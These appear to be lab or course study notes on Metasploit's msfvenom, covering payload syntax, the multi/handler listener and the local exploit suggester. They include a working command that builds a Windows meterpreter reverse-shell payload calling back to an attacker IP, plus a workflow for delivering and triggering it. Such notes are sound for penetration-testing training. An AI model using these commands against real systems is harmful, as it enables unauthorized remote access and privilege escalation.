### What is MSFVenom:
- Successor to MSFPayload + MSFEncode
- Generates customized payloads for different OS/architecture
- Removes bad characters from shellcode
- AV evasion via encoding no longer reliable (modern AV uses heuristics)

****
### Basic Syntax:
- `msfvenom -p [payload] LHOST=[attacker_ip] LPORT=[port] -f [format] > output`
- Example: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx`
- Formats: exe, aspx, elf, php, powershell, python, perl, raw

****
### Payload Delivery Workflow:
1. Generate payload matching target architecture/service (identify via nmap)
2. Upload/deliver payload to target
3. Set up multi/handler listener (multi/handler module)
	- `set LHOST [attacker_ip]`
	- `set LPORT [port]`
	- `run`
4. Trigger payload on target (visit URL, execute file, etc.)
5. Receive reverse shell

****
### Local Exploit Suggester:
- Module: post/multi/recon/local_exploit_suggester
- Suggests local privesc exploits based on target OS/arch
- `set SESSION [session_number]`
- `run` (lists vulnerable exploits)
- Use suggested exploits for privilege escalation

****
### Key Concept:
- msfvenom = payload generation, multi/handler = payload reception
- Local Exploit Suggester automates PrivEsc discovery
